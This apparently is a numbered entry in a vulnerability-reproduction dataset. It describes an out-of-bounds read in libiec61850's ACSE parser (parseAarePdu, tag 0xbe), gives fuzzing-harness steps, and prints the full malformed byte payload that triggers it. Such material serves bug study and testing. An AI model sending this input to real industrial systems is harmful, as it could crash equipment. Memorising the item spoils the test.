@@ -1,0 +1,10 @@
+Number: 513
+
+Summarize:
+In the libiec61850 library, `parseAarePdu` in `libiec61850/src/mms/iso_acse/acse.c` has an out-of-bounds read found by fuzzing. When parsing the `0xbe` (`user information`) tag, `bufPos` is advanced by `BerDecoder_decodeLength(...)` and then `buffer[bufPos]` is read without a bounds check. The report states that malformed input ending with bytes such as `be 00` can leave `bufPos` past the end of the buffer and trigger the out-of-bounds read in the `case 0xbe` path.
+
+Reproduce:
+Use the report's `LLVMFuzzerTestOneInput` harness pattern: initialize `AcseConnection` with `AcseConnection_init(&acseConnection, NULL, NULL, NULL)`, create a `ByteBuffer` with `ByteBuffer_create(NULL, size)`, append the input with `ByteBuffer_append(acseBuffer, data, size)`, call `AcseConnection_parseMessage(&acseConnection, acseBuffer)`, then destroy the buffer. Feed the malformed byte sequence shown in the report to this harness; it starts `61 30 30 02 ...` and ends with `... be 00`, which the report identifies as the trigger. The reported result is that parsing reaches `parseAarePdu`'s `0xbe` handling and performs an out-of-bounds read when `buffer[bufPos]` is accessed.
+
+Payload:
+61 30 30 02 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 09 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 0a 30 30 30 30 30 30 30 30 30 30 be 00
